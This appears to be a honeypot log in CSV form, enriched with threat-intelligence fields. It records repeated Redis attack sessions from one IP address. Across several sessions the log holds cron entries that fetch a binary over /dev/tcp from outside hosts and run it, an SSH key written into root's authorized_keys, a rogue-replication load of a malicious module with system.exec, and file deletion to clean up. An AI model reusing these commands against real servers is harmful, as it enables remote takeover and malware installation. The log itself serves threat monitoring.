time,action,Anon Src IP,src_port,level,VT Malicious,VT Engines,VT Labels,VT Reputation,Geo Location,ISP,Unnamed: 11,VT Tags,Malicious_Flag
4/1/2025 13:59,FLUSHDB,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q U27tlkr2JO;then exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/U27tlkr2JO ;fi && chmod +x /tmp/U27tlkr2JO && /tmp/U27tlkr2JO Yl2QZoCaWksyUF2FinqSSxMSSZBog51VSzFUVIWDf5tTFxtHnniDn19FMVdUhYN8nFMSG02GeoSRW1UxVVqLg3mfUxYTU5p4h4VfVzJfW5uDeZxNAYGeykO6zLSp1+h41il8bnJj\n""",171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,config set rdbcompression no,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,save,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,config set rdbcompression yes,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,config set dir .,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,config set dbfilename dump.rdb,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,config set dir /root/.ssh/,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,config set dbfilename authorized_keys,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,CONFIG SET dir /tmp/,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,CONFIG SET dbfilename exp.so,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,SLAVEOF 168.119.173.48 60142,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,MODULE LOAD /tmp/exp.so,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,SLAVEOF NO ONE,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,"system.exec ""bash -c \""exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/U27tlkr2JO && chmod +x /tmp/U27tlkr2JO && /tmp/U27tlkr2JO Yl2QZoCaWksyUF2FinqSSxMSSZBog51VSzFUVIWDf5tTFxtHnniDn19FMVdUhYN8nFMSG02GeoSRW1UxVVqLg3mfUxYTU5p4h4VfVzJfW5uDeZxNAYGeykO6zLSp1+h41il8bnJj\""""",171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,MODULE UNLOAD system,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 13:59,Closed,171.40.179.254,30646,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,NewConnect,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,info server,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,FLUSHDB,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q 80wSMrpO7f;then exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/80wSMrpO7f ;fi && chmod +x /tmp/80wSMrpO7f && /tmp/80wSMrpO7f yrrk0BjvwlCuLqZWwO8U3u+su7qu58YY78FQoC6lVMPvGNTvrLu6ru3GEfPKT6Y0o0/C+RDI56yxvark1hfhwlCgLqJR3fMQ0/uoubmg49YR8Mcii0Hp6OZ2GNA8R3mFJ8gPlBGpEAM=\n""",171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,config set rdbcompression no,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,save,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,config set dir .,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,config set dir /root/.ssh/,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,config set rdbcompression yes,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,config set dbfilename dump.rdb,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,config set dbfilename authorized_keys,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,CONFIG SET dir /tmp/,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,CONFIG SET dbfilename exp.so,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,SLAVEOF 168.119.173.48 60142,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,MODULE LOAD /tmp/exp.so,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,SLAVEOF NO ONE,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,"system.exec ""bash -c \""exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/80wSMrpO7f && chmod +x /tmp/80wSMrpO7f && /tmp/80wSMrpO7f yrrk0BjvwlCuLqZWwO8U3u+su7qu58YY78FQoC6lVMPvGNTvrLu6ru3GEfPKT6Y0o0/C+RDI56yxvark1hfhwlCgLqJR3fMQ0/uoubmg49YR8Mcii0Hp6OZ2GNA8R3mFJ8gPlBGpEAM=\""""",171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,MODULE UNLOAD system,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:00,Closed,171.40.179.254,31414,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q At2qSgSVft;then exec 6<>/dev/tcp/8.217.250.82/60148 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/At2qSgSVft ;fi && chmod +x /tmp/At2qSgSVft && /tmp/At2qSgSVft B/1fiOkMY45L/ln6dq6ycPhe4E6KZQLolFzscWjvW4r+GmCASeBZ9n6gsXD6RuFOg3wT54lA6X58616L5BByi07nRvd2rrJ290biTYhoFOCLX+lyY6WB7XOEruYJlrZ3ry8xdP7ZmRTWUT07y740PiI=\n""",171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,info server,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,FLUSHDB,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,NewConnect,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,config set rdbcompression no,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,save,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,config set dir .,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,config set dbfilename dump.rdb,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,config set rdbcompression yes,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,config set dir /root/.ssh/,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,config set dbfilename authorized_keys,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,CONFIG SET dir /tmp/,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,CONFIG SET dbfilename exp.so,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,SLAVEOF 8.217.250.82 60148,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,MODULE LOAD /tmp/exp.so,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,SLAVEOF NO ONE,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,"system.exec ""bash -c \""exec 6<>/dev/tcp/8.217.250.82/60148 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/At2qSgSVft && chmod +x /tmp/At2qSgSVft && /tmp/At2qSgSVft B/1fiOkMY45L/ln6dq6ycPhe4E6KZQLolFzscWjvW4r+GmCASeBZ9n6gsXD6RuFOg3wT54lA6X58616L5BByi07nRvd2rrJ290biTYhoFOCLX+lyY6WB7XOEruYJlrZ3ry8xdP7ZmRTWUT07y740PiI=\""""",171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,MODULE UNLOAD system,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:01,Closed,171.40.179.254,32178,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,config set rdbcompression no,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q mkpkfojaRs;then exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/mkpkfojaRs ;fi && chmod +x /tmp/mkpkfojaRs && /tmp/mkpkfojaRs hL9BvOZglLr85r+dfvG8RqXz9a5Auf9/k7bm+b+cYO65Q7Hx/aVGvu56l67w5ryUefG8Ra/r/a1KuO9/kbbo+b+SYOq+Xq318LFCvO10k775+bqS1G4ZOzhWtBLaOvN25JceS1dURg==\n""",171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,info server,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,NewConnect,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,FLUSHDB,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,save,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,config set dir .,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,config set dbfilename dump.rdb,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,config set rdbcompression yes,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,config set dir /root/.ssh/,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,config set dbfilename authorized_keys,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,CONFIG SET dbfilename exp.so,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,SLAVEOF 168.119.173.48 60142,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:02,CONFIG SET dir /tmp/,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,MODULE LOAD /tmp/exp.so,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,SLAVEOF NO ONE,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,config set dir .,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,config set dbfilename dump.rdb,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,"system.exec ""bash -c \""exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/mkpkfojaRs && chmod +x /tmp/mkpkfojaRs && /tmp/mkpkfojaRs hL9BvOZglLr85r+dfvG8RqXz9a5Auf9/k7bm+b+cYO65Q7Hx/aVGvu56l67w5ryUefG8Ra/r/a1KuO9/kbbo+b+SYOq+Xq318LFCvO10k775+bqS1G4ZOzhWtBLaOvN25JceS1dURg==\""""",171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,MODULE UNLOAD system,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,Closed,171.40.179.254,32738,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,info server,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,NewConnect,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q ATE94BKrFW;then exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/ATE94BKrFW ;fi && chmod +x /tmp/ATE94BKrFW && /tmp/ATE94BKrFW Y8GubxdLoX4gXGVdV0pebEgvf6FRHXmu0xsM0KttAVSofzdAYlBSVFtkRTl3vlcebrHTFxLPp2sVU6B+LUp0W1VTRGFCN32gUAFrrdMYFNGuaBuahXct+IhwKAhi86id+cKnEBFn4O3XdOhkuHlj\n""",171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,config set rdbcompression no,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,save,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,FLUSHDB,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,config set dir .,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,config set dbfilename dump.rdb,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,config set rdbcompression yes,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,config set dir /root/.ssh/,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:03,config set dbfilename authorized_keys,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,CONFIG SET dir /tmp/,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,CONFIG SET dbfilename exp.so,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,SLAVEOF 168.119.173.48 60142,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,MODULE LOAD /tmp/exp.so,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,SLAVEOF NO ONE,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,config set dir .,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,config set dbfilename dump.rdb,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,Closed,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,MODULE UNLOAD system,171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,"system.exec ""bash -c \""exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/ATE94BKrFW && chmod +x /tmp/ATE94BKrFW && /tmp/ATE94BKrFW Y8GubxdLoX4gXGVdV0pebEgvf6FRHXmu0xsM0KttAVSofzdAYlBSVFtkRTl3vlcebrHTFxLPp2sVU6B+LUp0W1VTRGFCN32gUAFrrdMYFNGuaBuahXct+IhwKAhi86id+cKnEBFn4O3XdOhkuHlj\""""",171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,33212,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,NewConnect,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,info server,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:04,FLUSHDB,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,config set dbfilename dump.rdb,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,config set dir .,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q RFfWOLUok2;then exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/RFfWOLUok2 ;fi && chmod +x /tmp/RFfWOLUok2 && /tmp/RFfWOLUok2 6774mccuzp7wsJudreebxzrJn/iqmIqv+5bRMcub56+SmrD7mcU2z575qYqSsPueyC7Nmvmwkpik/5/ONMeP+K+dhKv5gc0wyoH7rJiQqPmezjRQrsEp+RwGhggw+szH\n""",171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,config set rdbcompression no,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,save,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,config set rdbcompression yes,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,FLUSHDB,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
